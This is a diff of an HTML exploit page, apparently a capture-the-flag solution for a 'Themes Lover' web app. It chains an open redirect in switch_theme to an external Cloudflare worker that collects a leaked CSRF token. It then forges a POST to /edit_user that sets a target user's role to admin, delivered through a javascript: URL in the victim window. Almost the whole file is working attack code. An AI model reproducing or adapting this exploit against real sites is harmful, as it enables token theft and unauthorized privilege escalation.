@@ -1,107 +1,68 @@
 <!doctype html>
-<html lang="zh-Hant">
-<head>
-  <meta charset="utf-8">
-  <title>Themes Lover exploit</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
+<html>
 <body>
-<pre id="log">starting...</pre>
-
 <script>
-const WORKER_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev";
+const STREAM_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev";
 const TARGET_ORIGIN = "http://localhost:5000";
-const TARGET_USER_ID = "702762c6-8766-4ce8-8146-065cc4535363";
-const id = "run006";
+const TARGET_USER_ID = "11457e29-9694-446e-a1f2-d1061dff4eb8";
+const id = "run100";
 
-const logEl = document.getElementById("log");
-function log(...xs) {
-  const s = xs.join(" ");
-  console.log(s);
-  logEl.textContent += "\n" + s;
-}
-
-const workerHost = new URL(WORKER_BASE).host;
-
+const host = new URL(STREAM_BASE).host;
 const innerTheme =
-  `../../switch_theme?theme=light&redirect_path=//${workerHost}/css/${id}`;
+  `../../switch_theme?theme=light&redirect_path=//${host}/stream/${id}`;
 
 const victimUrl =
   `${TARGET_ORIGIN}/switch_theme?theme=${encodeURIComponent(innerTheme)}&redirect_path=/edit_user`;
 
 let victimWin = null;
-let navTimer = null;
-let pollTimer = null;
 let finished = false;
 
-function navVictim() {
-  const u = victimUrl + "#r=" + Math.random();
-  try {
-    if (!victimWin || victimWin.closed) {
-      victimWin = window.open(u, "victim");
-    } else {
-      victimWin.location = u;
-    }
-  } catch (e) {
-    log("[!] nav error", String(e));
-  }
+function openVictim() {
+  victimWin = window.open(victimUrl, "victim");
 }
 
 async function getState() {
-  const r = await fetch(`${WORKER_BASE}/state/${id}?r=${Math.random()}`, {
+  const r = await fetch(`${STREAM_BASE}/state/${id}?r=${Math.random()}`, {
     cache: "no-store"
   });
   return await r.json();
 }
 
-// 先保留最簡單版；等 done=true 再換成 run004 的 javascript: 提交
 function sendFinal(token) {
   if (finished) return;
   finished = true;
-  clearInterval(navTimer);
-  clearInterval(pollTimer);
 
-  log("[+] token =", token);
-  log("[+] sending final POST");
+  const js = `javascript:(() => {
+    const f = document.createElement('form');
+    f.method = 'POST';
+    f.action = '/edit_user';
+    f.innerHTML = \`
+      <input name="user_id" value="${TARGET_USER_ID}">
+      <input name="username" value="">
+      <input name="password" value="">
+      <input name="role" value="admin">
+      <input name="csrf_token" value="${token}">
+    \`;
+    document.body.appendChild(f);
+    f.submit();
+  })()`;
 
-  const form = document.createElement("form");
-  form.method = "POST";
-  form.action = `${TARGET_ORIGIN}/edit_user`;
-  form.target = "victim";
-  form.innerHTML = `
-    <input name="user_id" value="${TARGET_USER_ID}">
-    <input name="username" value="">
-    <input name="password" value="">
-    <input name="role" value="admin">
-    <input name="csrf_token" value="${token}">
-  `;
-  document.body.appendChild(form);
-  form.submit();
-
-  log("[+] submitted");
+  victimWin.location = js;
 }
 
 async function poll() {
-  try {
-    const st = await getState();
-    log(`[i] prefix="${st.prefix || ""}" len=${(st.prefix || "").length} done=${st.done}`);
+  const st = await getState();
+  console.log(st);
 
-    if (st.done && st.token) {
-      sendFinal(st.token);
-    }
-  } catch (e) {
-    log("[!] poll error", String(e));
+  if (st.done && st.token) {
+    sendFinal(st.token);
+    return;
   }
+  setTimeout(poll, 80);
 }
 
-log("[*] id =", id);
-log("[*] victimUrl =", victimUrl);
-
-navVictim();
+openVictim();
 poll();
-
-navTimer = setInterval(navVictim, 260);
-pollTimer = setInterval(poll, 70);
 </script>
 </body>
 </html>
